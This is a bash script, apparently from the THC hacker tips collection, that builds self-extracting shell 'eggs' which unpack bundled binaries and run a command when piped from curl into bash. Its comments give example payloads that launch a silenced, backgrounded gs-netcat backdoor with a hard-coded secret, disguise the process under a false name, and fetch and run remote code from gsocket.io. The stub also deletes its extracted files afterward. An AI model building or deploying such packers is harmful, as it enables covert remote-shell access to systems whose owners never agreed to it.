#! /usr/bin/env bash

# 2024 - https://thc.org/tips
#
# Pack multiple binaries, directories and scripts into a single
# executable and self extracting binary. On execution the binary
# unpacks itself and executes a run script or command.
#
# ./mkegg.sh egg.sh binary <binary2> [command/shellscript]
#
# The egg.sh can be piped into bash:
#     curl -SsfL https://example.com/egg.sh | bash
# or passed as command line option
#     bash -c "$(curl -SsfL https://example.com/egg.sh)"
# or executed:
#     ./egg.sh
#
# Example 1 - A binary and a run script
# ./mkegg.sh egg.sh foo run.sh
#     - Pack 'foo' and 'run.sh' into egg.sh
#     - When executing 'egg.sh': self-extract 'foo' and 'run.sh'
#       and execute ./run.sh
#
# Example 2 - A binary and a command
# ./mkegg.sh egg.sh foo '{ FOOBAR=HI ./foo; }'
#     - Pack 'foo' into egg.sh
#     - When executing './egg.sh': self-extract 'foo'. Set environment
#       variable FOOBAR=HI and execute ./foo
#
# Example 3 - A binary, a directory and a run script
# ./mkegg.sh egg.sh foo warez warez/run.sh
#     
# Advanced examples:
# ./mkegg.sh egg.sh gs-netcat '(GS_ARGS="-s SECRET1234 -ilq" gs-netcat 2>/dev/null &)'
# ./mkegg.sh egg.sh gs-netcat '(GS_ARGS="-s SECRET1234 -ilq" bash -c "exec -a kilo gs-netcat" 2>/dev/null &)'
# ./mkegg.sh egg.sh /dev/null '(GS_WEBHOOK_KEY=e90d4b38-8285-490d-b5ab-a6d5c7c990a7 bash -c "$(curl -fsSL https://gsocket.io/y)" 2>/dev/null >/dev/null &)'
# ./mkegg.sh egg.sh deploy-all.sh '(GS_WEBHOOK_KEY=e90d4b38-8285-490d-b5ab-a6d5c7c990a7 deploy-all.sh 2>/dev/null >/dev/null &)'

usage() {
    echo -e >&2 "Usage:
    $0 egg.sh binary command"
    exit 1
}
[[ $# -lt 3 ]] && usage

DST="${1}"
shift 1
CMD="${@: -1}" # last argument
set -- "${@:1:$(($#-1))}"

# We need a 'sleep 5' for Example 5: shell may exit and .tmp_egg deleted before
# bash had time to execute gs-netcat.

# HEAD='#! /bin/sh
# ARCHIVE=`awk '"'"'/^__ARCHIVE_BELOW__/ {print NR + 1; exit 0; }'"'"' $0`
# mkdir .tmp_egg || exit
# tail -n+$ARCHIVE "$0" | gunzip 2>/dev/null | tar x -C .tmp_egg
# (cd '.tmp_egg' && PATH=.:$PATH XXX)
# ({ sleep 5; rm -rf './.tmp_egg'; } 2>/dev/null >/dev/null &)
# exit 0
# __ARCHIVE_BELOW__'

HEAD='#! /bin/sh
run() {
    mkdir .tmp_egg || exit
    gunzip 2>/dev/null | tar -x -C .tmp_egg 2>/dev/null
    (cd '.tmp_egg' && PATH=.:$PATH XXX)
    ({ sleep 2; rm -rf './.tmp_egg'; } 2>/dev/null >/dev/null &)
    exit 0
}
if [ "$0" = bash ]; then
    while read -r l; do
        [ "$l" = "__ARCHIVE_BELOW__" ] && run
    done
else
    while read -r l; do
        [ "$l" = "__ARCHIVE_BELOW__" ] && run
    done <"$0"
fi
__ARCHIVE_BELOW__'

if [[ -f "$CMD" ]]; then
    HEAD="${HEAD//XXX/$CMD}"
    ARG=("$CMD")
else
    # escape ' correctly
    str="${CMD//\'/\'\"\'\"\'}"
    HEAD="${HEAD//XXX/\/bin\/sh -c \'"${str}"\'}"
fi
# echo "'$HEAD'"

[[ "$(tar --version)" == *"GNU"* ]] && TARG=("--owner=0" "--group=0")

[[ -f "${DST}" ]] && rm -f "${DST}"
(echo "$HEAD"; tar cfz - "${TARG[@]}" "$@" "${ARG[@]}" 2>/dev/null) >"${DST}"
chmod 700 "${DST}"
ls -al "${DST}"